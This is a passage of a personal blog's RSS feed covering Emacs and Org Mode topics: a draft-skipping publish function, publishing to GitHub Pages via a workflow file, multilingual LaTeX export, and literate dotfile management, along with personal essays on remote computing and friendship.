since this works, we can &rsquo;hack&rsquo; our way through: I can easily add a line
like `#+DRAFT: t` to my draft articles, and I&rsquo;m pretty sure you know where this
is going. Since I can both add such a line (automatically) to all articles I
haven&rsquo;t yet published<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup> and search for this line, I can create a wrapper
function based on that:
</p>
<div class="org-src-container">
<pre class="src src-elisp" id="org5e4b93c">(<span class="org-keyword">defun</span> <span class="org-function-name">my-publish-non-drafts</span> (plist filename pub-dir)
  <span class="org-doc">"Publish FILENAME only if it does not have a DRAFT property set to t."</span>
  (<span class="org-keyword">when</span> (not (string-equal <span class="org-string">"index.org"</span> (file-name-nondirectory filename)))
    (<span class="org-keyword">with-temp-buffer</span>
      (insert-file-contents filename)
      (goto-char (point-min))
      (<span class="org-keyword">let</span> ((is-draft (re-search-forward <span class="org-string">"^#\\+DRAFT:\\s-*t"</span> nil t)))
        (<span class="org-keyword">unless</span> is-draft
          (org-html-publish-to-html plist filename pub-dir))))))
</pre>
</div>

<p>
I would never characterize this function as elegant. <b>BUT</b> it gets the work done, and
that&rsquo;s all that matters. Some years after migrating to `org+emacs+allmyhacks` for
my blog, I now have a default &rsquo;draft&rsquo; state on all of my articles.
</p>
</div>
</div>
<div id="outline-container-orge938926" class="outline-2">
<h2 id="orge938926"><span class="section-number-2">6.</span> <a href="#orge938926">Summary</a></h2>
<div class="outline-text-2" id="text-6">
<p>
Well, this is it: the stupid solution
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Or many of those
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<b>and</b> to all new articles upon creation
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Future of personal computers</title>
<link>posts/20230412_future_of_personal_computers.html</link>
<pubDate>Wed, 12 Apr 2023 13:29:00 +0300</pubDate>
<guid>posts/20230412_future_of_personal_computers.html</guid>
<description>
<![CDATA[<div class="note" id="org84928c9">
<p>
Actual finalization date is <span class="timestamp-wrapper"><span class="timestamp">&lt;2023-09-20 Wed&gt;</span></span>. 
</p>

</div>

<p>
I was just thinking how strange our times are. Everything is so
rapidly changing and what seems only logical to happen next feels like
an absurdity of our imagination. For example &#x2026; computers.
</p>

<p>
We have gotten used to having a computer next to us to work on, but it
often is a mere illusion: even at the moment of writing, many people
work on remote computers.
</p>

<p>
If it is already happening, what am I thinking of? Simply the extend
to which this can dominate personal computing.
</p>

<p>
As someone that has gone far and wide (unfortunately) numerous times
to create  his ideal working environment, I am deeply intrigued by the
potential effect that the high QoS in modern networking may have in
personal (and professional) computing. Make something once, and always
work on it: No more searching for files between computers. No more,
having a cloud service to sync your files between different computers.
No more setting your applications up on each one. No more, no more.
</p>

<p>
<i>Going back to a mainframe model</i>, one may opt to always connect to a
specific machine (it does not even need to be physical - obviously),
from all of their devices. There are some technical difficulties and
lots of security challenges, but undoubtedly, we&rsquo;re heading that way.
</p>

<p>
Just like NVIDIA, and other companies I may not be aware of, tried
with gaming: to have a base-level device streaming high quality
content through the Internet, allowing the users to overcome the
limitations of their handheld device, this can happen one a much
larger scale.
</p>

<p>
After all, this could be revolutionizing, slashing the need to have
many highly capable devices, but replacing those with (barely
functional - compared to the high end ones I suppose) ones that only
serve as the monitor and the other peripherals.
</p>

<p>
However, obviously danger is around the corner (&ldquo;μηδέν καλόν αμιγές
κακού&rdquo;). 
</p>

<table>
<caption class="t-above"><span class="table-number">Table 1:</span> Some advantages and disadvantages to the <i>mainframe</i> model</caption>

<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Advantages</th>
<th scope="col" class="org-left">Disadvantages</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Easier to maintain</td>
<td class="org-left">More difficult to set up</td>
</tr>

<tr>
<td class="org-left">All files at one place</td>
<td class="org-left">Inherently more challenging to secure</td>
</tr>

<tr>
<td class="org-left">Only one machine needs to be upgraded every now and then - <i>peripherals</i> may remain</td>
<td class="org-left"><i>Mainframe</i> requires more computing power</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">Prone to subscription model (and all that it entails)</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>


<p>
This last disadvantage, the dystopic thought that made me think of
this <i>mainframe</i> model, is from my point of view, rather crucial.
Especially since everything around us seems to be moving at the speed
of light towards a subscription based / own-nothing model.
</p>

<p>
Although the advantages are by no means insignificant, it is vital
that the subscription model does not eliminate <i>traditional</i> computing.
I can only imagine the freedom of speech, privacy, availability,
financial and so on concerns of <b>having to depend</b> on a
(not-always-trusty) third party to host your computer.
</p>

<p>
I may develop on the inherent dangers of the domination of the
subscription based model to the world. The lack of regulation and talk
around it is troubling.
</p>

<p>
To personal computing
</p>
<blockquote>
<p>
Just stick around cause we will miss you
</p>
</blockquote>
]]>
</description></item>
<item>
<title>Starting again</title>
<link>posts/20220127_first_post.html</link>
<pubDate>Thu, 17 Feb 2022 00:00:00 +0200</pubDate>
<guid>posts/20220127_first_post.html</guid>
<description>
<![CDATA[<p>
In my previous attempts to host my personal website the problem was obvious; I
focused too much on properly defining what my blog should be about that it took
the whole fun of writing out of it. I decided to avoid making the same mistake
again, which translates into <i>more writing, less tinkering with the website</i><sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>.
</p>

<p>
I will write on a plethora of subjects, books and ideas that I believe are worth
putting out so that they are improved.
</p>

<p>
Since I have not decided on a topic for an article yet, there are too many I&rsquo;m
after and, to be frank, many that I&rsquo;m afraid I won&rsquo;t do justice to, I have
decided to use the first <span class="underline">article</span> in my website to thank two people I have
never met but to whom I attribute this <i>new try</i> on a personal blog.
</p>

<p>
I would really like to thank <a href="https://github.com/rougier">Nicolas P. Rougier</a>,  for he is the creator of the
css theme that I have used in this website<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>. I first saw it almost a year
ago when I first started reading on <a href="https://gettingthingsdone.com/">Getting Things Done</a> and I don&rsquo;t
think I have ever found a styling sheet that I like so much.
</p>

<p>
With that said, I feel it is not right not to mention his open-source work and
thank him for inspiring me to always try to do more. (It still happens, every
time I check his github profile)
</p>

<p>
Also, special thanks go to <a href="https://daviwil.com/">David Wilson</a>, for his excellent videos on Emacs,
helping me gain the most out of Emacs after being a vim user for more than 5
years. It was through his <a href="https://www.youtube.com/c/SystemCrafters">videos</a>, that I discovered how deep one could dive into
emacs and, more important to me, <a href="https://orgmode.org/">Org Mode</a> configuration, allowing me to <a href="https://www.youtube.com/watch?v=AfkrzFodoNw">publish
my own website</a>, without <i>(relatively)</i> much hassle.
</p>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
6 months later and I did <b>exactly</b> what I said I&rsquo;d avoid.
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
The css file is available under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> at <a href="https://github.com/rougier/emacs-gtd/blob/master/GTD.css">rougier/emacs-gtd</a>
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>With (More Than) A Little Help From My friends</title>
<link>posts/20220401_to_my_friends.html</link>
<pubDate>Fri, 01 Apr 2022 00:00:00 +0300</pubDate>
<guid>posts/20220401_to_my_friends.html</guid>
<description>
<![CDATA[<p>
Αν μου έλεγε κανείς ποτέ πως όταν, επιτέλους, θα αποφάσιζα να φτιάξω και να
<i>συντηρώ</i><sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> την δική μου ιστοσελίδα, θα την χρησιμοποιούσα για να γράψω το
συγκεκριμένο άρθρο μάλλον θα γέλαγα. Θα το καταλάβαινα μα παρόλα αυτά θα γέλαγα.
</p>

<p>
Αυτό το άρθρο είναι σαν <i>φόρος τιμής</i> για όλους εκείνους τους φίλους που θεωρώ
κολλητούς μου και που θα έκανα τα πάντα για εκείνους, παρόλα αυτά φαίνεται σαν
να έχω ξεχάσει και να μη δίνω σημασία. Είναι για όλους εκείνους τους φίλους, που
όταν καταφέρνω και τους κάνω να χαμογελάσουν ή όταν σπάνια, και αλήθεια λυπάμαι
για αυτό, φαίνομαι χρήσιμος και τους βοηθάω, νιώθω τον κόσμο να είναι ένα πολύ
πιο χαρούμενο μέρος. Είναι για τους φίλους που ποτέ δεν έμαθαν οτι τους θεωρώ
φίλους μου, ούτε το πόσο σημαντικοί είναι για μένα γιατί&#x2026; <i>άνθρωποι</i>: Μερικές
φορές κρατάμε κακία και ηλίθιους τύπους αντί να είμαστε καλοί και ο εαυτός μας.
Είναι για όλους με τους οποίους μάλωσα ξανά και ξανά και ξανά, και όμως τώρα δεν
μπορώ να θυμηθώ ούτε μια φορά που φωνάξαμε ούτε μια φορά που να μη γελάγαμε
μαζί. Είναι για όλους εκείνους με τους οποίους έχτισα τόσο όμορφες και ζεστές
αναμνήσεις.
</p>

<p>
Σας ευχαριστώ πάρα πολύ. Και λυπάμαι που δεν είμαι καλύτερος φίλος. Λυπάμαι που
δεν βγαίνω έξω μαζί σας όλη την ώρα να σας το δείχνω. Λυπάμαι που αυτά τα λόγια
αν/θα τα διαβάσετε μέσα απο μία οθόνη αντί να τα ακούσετε απο μένα σε κάποια
βόλτα. Απλά ήθελα να ξέρετε πως και αν και έχω τις δικές μου βλακείες και
ιδαιτερότητες - τις τύψεις και τις αηδίες - είμαι πάντα εδώ για σας.
</p>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Έστω με τον τρόπο που το κάνω, με τις βιαστικές σημειώσεις, review, και ιδέες
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Exporting Org Mode to LaTeX and PDFs - Multilanguage</title>
<link>posts/20220527_exporting_org_mode_to_latex_multilanguage.html</link>
<pubDate>Fri, 27 May 2022 10:40:00 +0300</pubDate>
<guid>posts/20220527_exporting_org_mode_to_latex_multilanguage.html</guid>
<description>
<![CDATA[<p>
One problem I often encountered when dealing with \LaTeX was the fact that I
could not get the document to be multilingual. More specifically, back in my
<code>vim</code> days, I had a set up tailored to my notetaking &#x2026;
</p>

<p>
I did not like the fact that everything had to be compiled in order for me to
see it though. I like it when I can keep things simple ( KISS ) and that&rsquo;s what
drove me to org mode in the first place (That and GTD to be frank, even though I
have since personalized the whole setup to my needs).
</p>

<p>
I can now write <b>everything</b> in a very <i>beautiful</i> if you ask me and organized
structure, completely inside my editor, have my own functions for automatic
creation and so on, and of course, writing \LaTeX expressions is still
<b>extremely</b> easy, if not easier than using snippets through CDLaTeX
</p>

<p>
So, while installing \LaTeX with all the impressive additions, synching,
realtime exporting and so on, I thought to myself that I do not want to go
through the hassle of writing <code>\engbloc{PSPICE}</code> every time I need english
characters. <sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

<p>
What is needed then?
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> org-latex-compiler <span class="org-string">"xelatex"</span>)

(add-to-list 'org-latex-packages-alist
             '(<span class="org-string">"AUTO"</span> <span class="org-string">"polyglossia"</span> t (<span class="org-string">"xelatex"</span> <span class="org-string">"lualatex"</span>)))
</pre>
</div>

<p>
Along with that it is important noting down that these options are useful
</p>
<blockquote>
</blockquote>
<div id="outline-container-orgb146698" class="outline-2">
<h2 id="orgb146698"><span class="section-number-2">1.</span> <a href="#orgb146698">Notice</a></h2>
<div class="outline-text-2" id="text-1">
<p>
I would not say, however, that org mode can replace plain \LaTeX. That&rsquo;s because it
can not. It is a fact that in order for you to customize your document,  you&rsquo;ll
need to spend much more time in org mode than by simply working in \LaTeX all
along&#x2026;
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Now, having checked <code>xelatex</code> for just a little bit of time, it seems
that using <code>latexmk</code> with babel instead of <code>xelatex</code> with polyglossia was a huge
error - yet \LaTeX remains more difficult than plain org.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>How i publish my static blog on Github pages using Emacs</title>
<link>posts/20220719_how_i_publish_my_static_blog_on_github_pages_using_emacs.html</link>
<pubDate>Tue, 19 Jul 2022 19:26:00 +0300</pubDate>
<guid>posts/20220719_how_i_publish_my_static_blog_on_github_pages_using_emacs.html</guid>
<description>
<![CDATA[<div id="outline-container-org68a2541" class="outline-2">
<h2 id="org68a2541"><span class="section-number-2">1.</span> <a href="#org68a2541">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Almost everyone nowadays agrees that having a personal website is a virtue. That
consists of two parts<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>: The technical and the writing one.
</p>

<p>
Of course, I would not try to tell you how to write.
</p>

<p>
This article aims to <i>fill</i> a very niche gap on the first aspect of personal
blogs: to show how one can use Emacs and Org Mode to create the website they
want <b>and</b> how to host it on GitHub Pages.
</p>
</div>
<div id="outline-container-orga540b2e" class="outline-3">
<h3 id="orga540b2e"><span class="section-number-3">1.1.</span> <a href="#orga540b2e">Notice</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
I wrote this article in a form of rubber duck debugging of my own publishing
progress. As such it will remain a work-in-progress even after its publication.
</p>
</div>
</div>
</div>
<div id="outline-container-orga8e3001" class="outline-2">
<h2 id="orga8e3001"><span class="section-number-2">2.</span> <a href="#orga8e3001">Why Emacs and Org Mode? A personal story</a></h2>
<div class="outline-text-2" id="text-2">
<div class="note" id="orgbd718e9">
<p>
If you have found a setup you like and feel comfortable working in, then there&rsquo;s
no need to listen to me or anyone else about moving to a different editor. 
</p>

</div>

<p>
The answer for me was pretty simple. I moved to Emacs almost a year from now
(<span class="timestamp-wrapper"><span class="timestamp">&lt;2022-12-06 Tue&gt;</span></span>), having used <code>vim</code> for something less than 5 years, on a daily,
almost, basis.
</p>

<p>
I love plain text.
</p>

<p>
However, when I had to publish something I was writing mainly in \(\LaTeX\), and
even with my good ol&rsquo; snippets, it felt far from natural<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>.Somehow,
somewhere I read about Org Mode and decided to give it a shot; it did not
disappoint.
</p>

<p>
Its syntax is very similar to markdown but, it has <b>numerous</b> benefits and extra
capabilities (if you are an Emacs user that is).
</p>
</div>
</div>
<div id="outline-container-orga0592f1" class="outline-2">
<h2 id="orga0592f1"><span class="section-number-2">3.</span> <a href="#orga0592f1">Piece of wisdom: Write small scripts</a></h2>
<div class="outline-text-2" id="text-3">
<blockquote>
<p>
Do not think of coding projects as <b>major ones</b>
</p>
</blockquote>

<p>
It was only during the last year of using <code>vim</code> that I realized the power of
writing scripts for myself, instead of searching for plugins, extensions and
other <i>pre-made</i> scripts. Do not get me wrong: <b>If they exist, use them</b>. Follow
the path of least resistance and be ruthless to the things that do not matter.
</p>
</div>
</div>
<div id="outline-container-orgb8db552" class="outline-2">
<h2 id="orgb8db552"><span class="section-number-2">4.</span> <a href="#orgb8db552">The Process</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Publishing with Emacs is relatively simple as long as you follow some basic
principles:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> You need to create your files yourself and give them the proper attributes
(such as a title, filetags, a date and or a description)</li>
<li class="off"><code>[&#xa0;]</code> You need to keep your <i>content</i> directory clean and organized because your
website&rsquo;s hierarchy will mimic your working one.</li>
<li class="off"><code>[&#xa0;]</code> You understand how it functions:
<ol class="org-ol">
<li>You write in org inside your git repo</li>
<li>You commit the changes</li>
<li>You push the changes to your GitHub repo (effectively making them public)</li>
<li>GitHub actions takes over and launches a VM on which it installs Emacs</li>
<li>Emacs is called within that VM through your <code>bash</code> script and performs
<code>org-publish</code></li>
<li>The files that <code>org-publish</code> creates do not litter your working branch, but
they reside on a different one, pages</li>
<li>A web server then runs on that branch, letting you visit these files just
like any other website.</li>
</ol></li>
</ul>
</div>
<div id="outline-container-orgce51e21" class="outline-4">
<h4 id="orgce51e21"><span class="section-number-4">4.0.1.</span> <a href="#orgce51e21">Dealing with the Emacs Back End:</a></h4>
<div class="outline-text-4" id="text-4-0-1">
<div class="note" id="org5974802">
<p>
Writing in <span class="timestamp-wrapper"><span class="timestamp">&lt;2022-12-06 Tue&gt;</span></span>, this configuration file is actually outdated due to
the fact that I did not remember publishing it. <i><b>sigh</b></i>. It will be fixed in the
future, but the <code>.el</code> version can always be found in my blog repo.
</p>

</div>

<p>
I have published my <a href="posts/20221228_elisp-org-publish-blog-configuration.html">elisp script</a>, largely based on the one SystemCrafters&rsquo; David
Wilson (<a href="https://www.youtube.com/c/SystemCrafters">channel</a>) shared elisp configuration.
</p>
</div>
</div>
<div id="outline-container-orgb911af2" class="outline-3">
<h3 id="orgb911af2"><span class="section-number-3">4.1.</span> <a href="#orgb911af2">Bash</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
One liner - not really much to say here
</p>
</div>
</div>
<div id="outline-container-org57aa4ac" class="outline-3">
<h3 id="org57aa4ac"><span class="section-number-3">4.2.</span> <a href="#org57aa4ac">Publishing on Github</a></h3>
<div class="outline-text-3" id="text-4-2">
<p>
In order for Github to function as described above a file called <code>publish.yml</code> in
<code>.github/workflows/</code> is needed 
</p>

<div class="org-src-container">
<pre class="src src-yaml">name: Publish to GitHub Pages

on:
  push:
    branches:
      - main

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: Check out
        uses: actions/checkout@v1

      - name: Install Emacs
        run: sudo apt install emacs-nox --yes

      - name: Build the site
        run: ./build.sh

      - name: Link Checker
        uses: lycheeverse/lychee-action@v1.0.8
        with:
          args: --verbose --no-progress ./public/**/*.html

      - name: Publish generated content to GitHub Pages
        uses: JamesIves/github-pages-deploy-action@4.1.4
        with:
          branch: gh-pages
          folder: public
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org799d8c4" class="outline-2">
<h2 id="org799d8c4"><span class="section-number-2">5.</span> <a href="#org799d8c4">Notes:</a></h2>
<div class="outline-text-2" id="text-5">
<ul class="org-ul">
<li>To see these in action feel free to browse this blog&rsquo;s <a href="https://github.com/chatziiola/chatziiola.github.io">source</a></li>
<li>Of course you can run the bash script locally, maybe with Emacs&rsquo; <code>httpd</code> mini
webserver or with your python oneliner to preview it before publishing. After
all, a problem for me often is that a problem in the <code>publish.yml</code> execution may
result in my website taken offline.</li>
</ul>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
&#x2026;and, if you navigate around mine, I think it will be pretty obvious
which one could use a little bit of work:
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://castel.dev">The best resource out there for notetaking with vim and latex</a>.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Literate Configuration Management with vanilla Emacs</title>
<link>posts/20220903_literate_configuration_management_with_vanilla_emacs.html</link>
<pubDate>Sat, 03 Sep 2022 23:56:00 +0300</pubDate>
<guid>posts/20220903_literate_configuration_management_with_vanilla_emacs.html</guid>
<description>
<![CDATA[<div id="outline-container-orga5930e2" class="outline-2">
<h2 id="orga5930e2"><span class="section-number-2">1.</span> <a href="#orga5930e2">Update: <span class="timestamp-wrapper"><span class="timestamp">&lt;2022-12-23 Fri&gt;</span></span>:</a></h2>
<div class="outline-text-2" id="text-1">
<p>
This is all completely unnecessary. It turns out that you can practically
achieve the same functionality with <code>imenu-list</code>, without it being so slow.
</p>
</div>
</div>
<div id="outline-container-org82e775a" class="outline-2">
<h2 id="org82e775a"><span class="section-number-2">2.</span> <a href="#org82e775a">Introduction</a></h2>
<div class="outline-text-2" id="text-2">
<p>
I manage my dotfiles using GNU Stow. This means that I have a git directory
<a href="posts/../../">dotfiles</a>, which contains the configuration files for the applications I have
bothered tailoring to my needs. Maintaining it is not as simple as it sounds,
though.
</p>

<p>
In this article I aim to describe how this got <i>just a little bit</i> easier for me
in the past couple days
</p>
</div>
</div>
<div id="outline-container-orgbd98a74" class="outline-2">
<h2 id="orgbd98a74"><span class="section-number-2">3.</span> <a href="#orgbd98a74">Building the script</a></h2>
<div class="outline-text-2" id="text-3">
<p>
The following folder hierarchy shows part of the general dotfiles problem:
</p>

<blockquote>
<ul class="org-ul">
<li>dotfiles
<ul class="org-ul">
<li>bspwm
<ul class="org-ul">
<li>.config
<ul class="org-ul">
<li>bspwm
<ul class="org-ul">
<li>bspwm.org</li>
<li>bspwmrc</li>
</ul></li>
</ul></li>
</ul></li>
<li>sxhkd
<ul class="org-ul">
<li>.config
<ul class="org-ul">
<li>sxhkd
<ul class="org-ul">
<li>sxhkd.org</li>
<li>sxhkdrc</li>
</ul></li>
</ul></li>
</ul></li>
<li>zsh
<ul class="org-ul">
<li>zsh.org</li>
<li>.zshrc</li>
</ul></li>
<li>emacs
<ul class="org-ul">
<li>.emacs.d
<ul class="org-ul">
<li>config.org</li>
</ul></li>
</ul></li>
<li>&#x2026;</li>
</ul></li>
</ul>
</blockquote>

<p>
The directories above highlight the fact that <b>there is not a single place to look</b>.
Almost every package has something different in the way it structures its
dotfiles, that makes the use of regular expressions necessary. Obviously, we
want to recursively search our directory for <code>.org</code> files.
</p>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> chatziiola/dot-dir <span class="org-string">"~/dotfiles/emacs"</span>)
(directory-files-recursively chatziiola/dot-dir <span class="org-string">"org$"</span>)
</pre>
</div>
</div>
<div id="outline-container-orgb2c3879" class="outline-3">
<h3 id="orgb2c3879"><span class="section-number-3">3.1.</span> <a href="#orgb2c3879">Dealing with too many org files</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
A problem arises: Too many files within the emacs directory, almost all of which
from the <code>straight</code> subdirectory <i>(this is what hapenned to me, it may be different
for you)</i>. To solve that we need to filter out non-important to our configs org files.
</p>

<p>
The way I see it there are two possible scenarios, neither of which do I like:
</p>
<ol class="org-ol">
<li>Play with the output of <code>directory-files-recursively</code>, filtering out whatever
contains an element of our blacklist</li>
<li>Redefine the <code>directory-files-recursively</code> function with one more parameter
<code>DIR-REGEXP</code>. Since it is a rather small function, I&rsquo;m pretty sure we can work
it out.</li>
</ol>

<p>
Alright, alright, alright. I found the third option:
</p>
<ol class="org-ol">
<li><p>
Instead of using files in this format <code>&lt;app&gt;.org</code> , we are to use files only
named as <b>config.org</b> and then differentiate them in the selection panel using
their &ldquo;TITLE&rdquo; property
</p>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> chatziiola/dot-dir <span class="org-string">"~/dotfiles/"</span>)
(directory-files-recursively chatziiola/dot-dir <span class="org-string">"^config.org$"</span>)
</pre>
</div></li>
</ol>
</div>
</div>
<div id="outline-container-orge15c653" class="outline-3">
<h3 id="orge15c653"><span class="section-number-3">3.2.</span> <a href="#orge15c653">Getting the titles</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
Make sure that we get the title of our configuration files:
</p>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> chatziiola/dot-dir <span class="org-string">"~/dotfiles/"</span>)
(<span class="org-keyword">dolist</span> (file (directory-files-recursively chatziiola/dot-dir <span class="org-string">"^config.org$"</span>))
        (<span class="org-keyword">unless</span> (stringp (chatziiola/get-keyword-value <span class="org-string">"TITLE"</span> file))
                 (print file)))
</pre>
</div>
</div>
<ol class="org-ol">
<li><a id="orga779b2e"></a><a href="#orga779b2e">Complementary functions</a><br>
<div class="outline-text-5" id="text-3-2-0-1">
<p>
These functions were found online (albeit the second one has been changed) when
I was building my lecture notetaking scripts
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-comment-delimiter">; </span><span class="org-comment">This and the next func ( even though slightly modified ):</span>
<span class="org-comment-delimiter">; </span><span class="org-comment">src: https://stackoverflow.com/questions/66574715/how-to-get-org-mode-file-title-and-other-file-level-properties-from-an-arbitra</span>
(<span class="org-keyword">defun</span> <span class="org-function-name">ndk/get-keyword-key-value</span> (kwd)
  <span class="org-doc">"This function was found on stackoverflow - google or see config.org for more. \n It should only be used by ~chatziiola/get-keyword-value~"</span>
  (<span class="org-keyword">let</span> ((data (cadr kwd)))
    (list (plist-get data <span class="org-builtin">:key</span>)
          (plist-get data <span class="org-builtin">:value</span>))))

(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/get-keyword-value</span> (key <span class="org-type">&amp;optional</span> file)
  <span class="org-doc">"Return the actual value associated with key '</span><span class="org-doc"><span class="org-constant">myString</span></span><span class="org-doc">' of the current org buffer\n For example: (chatziiola/get-keyword-value \"TITLE\") should return the title of that org file."</span>
        <span class="org-comment-delimiter">; </span><span class="org-comment">Return the nth element of the list</span>
  <span class="org-comment-delimiter">;; </span><span class="org-comment">TODO better documentation</span>
  (<span class="org-keyword">let</span> ((file (<span class="org-keyword">or</span> file <span class="org-string">""</span>)))
    (<span class="org-keyword">cond</span>
     ((not (string-blank-p file))
      (<span class="org-keyword">with-current-buffer</span> (find-file-noselect file) (chatziiola/get-keyword-value key)))
     <span class="org-comment-delimiter">;; </span><span class="org-comment">In that case key is a list of keys actually</span>
     ((proper-list-p key)
      (<span class="org-keyword">let</span> ((keyVals '()))
        (<span class="org-keyword">cl-loop</span> for title in key
              do (add-to-list 'keyVals (chatziiola/get-keyword-value title) t))
        keyVals)
      )
     (t
      (nth 1 (assoc key (org-element-map (org-element-parse-buffer 'greater-element) '(keyword) #'ndk/get-keyword-key-value)))))))
</pre>
</div>
</div>
</li>
</ol>
</div>
<div id="outline-container-org088b2c7" class="outline-3">
<h3 id="org088b2c7"><span class="section-number-3">3.3.</span> <a href="#org088b2c7">Presenting Them To The User</a></h3>
<div class="outline-text-3" id="text-3-3">
<p>
Create a dictionary in the form of <code>"TITLE":"FILE"</code>:
</p>
<blockquote>
<p>
We do not call it a directory but rather a <i>prompt-list</i>
</p>
</blockquote>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> chatziiola/dot-dir <span class="org-string">"~/dotfiles/"</span>)

(<span class="org-keyword">let*</span> ((config-files (directory-files-recursively chatziiola/dot-dir <span class="org-string">"^config.org$"</span>))
       (prompt-list (seq-map (<span class="org-keyword">lambda</span> (e) (list (format <span class="org-string">"%-20s %-25s"</span> (chatziiola/get-keyword-value <span class="org-string">"TITLE"</span> e) e) e)) config-files)))
prompt-list)
</pre>
</div>


<p>
Prompt the user to select and get the file to be edited
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> chatziiola/dot-dir <span class="org-string">"~/dotfiles/"</span>)

(<span class="org-keyword">let*</span> ((config-files (directory-files-recursively chatziiola/dot-dir <span class="org-string">"^config.org$"</span>))
       (prompt-list (seq-map (<span class="org-keyword">lambda</span> (e) (list (format <span class="org-string">"%-20s %-25s"</span> (chatziiola/get-keyword-value <span class="org-string">"TITLE"</span> e) e) e)) config-files))
       (prompt-answer (completing-read <span class="org-string">"Select configuration file: "</span> prompt-list)))
<span class="org-comment-delimiter">; </span><span class="org-comment">Prompt an</span>
(car (last (assoc prompt-answer prompt-list))))
</pre>
</div>

<p>
Script building is over: Just open the file
</p>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> chatziiola/dot-dir <span class="org-string">"~/dotfiles/"</span>)

(find-file
       (<span class="org-keyword">let*</span> ((config-files (directory-files-recursively chatziiola/dot-dir <span class="org-string">"^config.org$"</span>))
              (prompt-list (seq-map (<span class="org-keyword">lambda</span> (e) (list (format <span class="org-string">"%-20s %-25s"</span> (chatziiola/get-keyword-value <span class="org-string">"TITLE"</span> e) e) e)) config-files))
              (prompt-answer (completing-read <span class="org-string">"Select configuration file: "</span> prompt-list)))
       <span class="org-comment-delimiter">; </span><span class="org-comment">Prompt an</span>
       (car (last (assoc prompt-answer prompt-list)))))
</pre>
</div>
</div>
</div>
<div id="outline-container-orgfe236d8" class="outline-3">
<h3 id="orgfe236d8"><span class="section-number-3">3.4.</span> <a href="#orgfe236d8">Integrating rougier&rsquo;s scripts</a></h3>
<div class="outline-text-3" id="text-3-4">
<p>
With the steps above with have achieved a <i>basic level</i> of ease when dealing with
dotfiles. What is missing?
</p>
<ol class="org-ol">
<li>Declaring it as an interactive function</li>
<li>Binding it to a key</li>
<li>Integrating Rougier</li>
</ol>
</div>
<div id="outline-container-orga43f242" class="outline-4">
<h4 id="orga43f242"><span class="section-number-4">3.4.1.</span> <a href="#orga43f242">@<a href="https://github.com/rougier">rougier</a> functions</a></h4>
<div class="outline-text-4" id="text-3-4-1">
<p>
<code>rougier</code> implemented these wonderful functions ( that inspired me to work on
this ):
</p>
<div class="org-src-container">
